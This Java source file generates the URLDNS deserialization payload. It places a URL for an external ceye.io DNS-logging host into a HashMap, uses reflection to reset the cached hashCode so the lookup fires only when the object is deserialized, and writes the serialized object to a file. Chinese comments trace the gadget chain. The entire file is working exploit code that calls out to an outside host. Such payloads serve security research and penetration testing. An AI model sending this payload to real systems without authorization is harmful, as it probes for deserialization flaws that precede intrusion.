package run.ergou.deserialize.urldns;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class CreatePayload {
    public static void main(String[] args) throws Exception {
        /*
        利用链:
            ObjectInputStream#readObject() -> HashMap.readObject(ObjectInputStream in)
            HashMap -> hash()
            URL -> hashCode()
            URLStreamHandler -> hashCode()
            URLStreamHandler -> getHostAddress()
            URL -> getHostAddress()
            InetAddress -> getByName()
         */
        HashMap hashMap = new HashMap();
        URL url = new URL("http://v3vbk7.ceye.io");

        /*
        URL：
            private int hashCode = -1;

            public synchronized int hashCode() {
                if (hashCode != -1)
                    return hashCode;
                hashCode = handler.hashCode(this);
                return hashCode;
            }

        HashMap.put()和本利用链都会执行至URL.hashCode()
        */
        Field hashCodeField = url.getClass().getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);

        // 阻止创建payload时触发请求
        hashCodeField.set(url, 0);
        hashMap.put(url, null);
        // 使利用链执行时能够触发请求
        hashCodeField.set(url, -1);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(new File("urldns")));
        oos.writeObject(hashMap);
        oos.close();
    }

}
